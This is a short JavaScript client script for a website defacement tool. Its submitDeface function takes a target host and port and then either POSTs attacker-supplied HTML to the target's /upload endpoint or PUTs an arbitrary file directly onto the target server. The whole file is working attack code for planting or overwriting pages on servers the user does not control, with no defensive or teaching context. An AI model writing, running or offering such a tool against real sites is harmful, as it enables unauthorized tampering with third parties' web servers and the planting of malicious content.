document.getElementById("method").addEventListener("change", e => {
    const isJSO = e.target.value === "jso";
    document.getElementById("jso-form").style.display = isJSO ? "block" : "none";
    document.getElementById("file-form").style.display = isJSO ? "none" : "block";
  });
  
  async function submitDeface() {
    const target = document.getElementById("target").value;
    const port = document.getElementById("port").value || "80";
    const method = document.getElementById("method").value;
    const fullURL = `${target}:${port}`;
  
    if (method === "jso") {
      const filename = document.getElementById("filename").value;
      const html = document.getElementById("html").value;
      const payload = {
        filename: filename,
        content: html,
        content_type: "text/html"
      };
  
      try {
        const res = await fetch(`${fullURL}/upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        const text = await res.text();
        document.getElementById("output").textContent = text;
      } catch (e) {
        document.getElementById("output").textContent = "❌ ERROR: " + e;
      }
  
    } else {
      const file = document.getElementById("uploadFile").files[0];
      if (!file) return alert("Pilih file dulu!");
      
      try {
        const res = await fetch(`${fullURL}/${file.name}`, {
          method: "PUT",
          body: file
        });
        const text = await res.text();
        document.getElementById("output").textContent = text;
      } catch (e) {
        document.getElementById("output").textContent = "❌ ERROR: " + e;
      }
    }
  }
  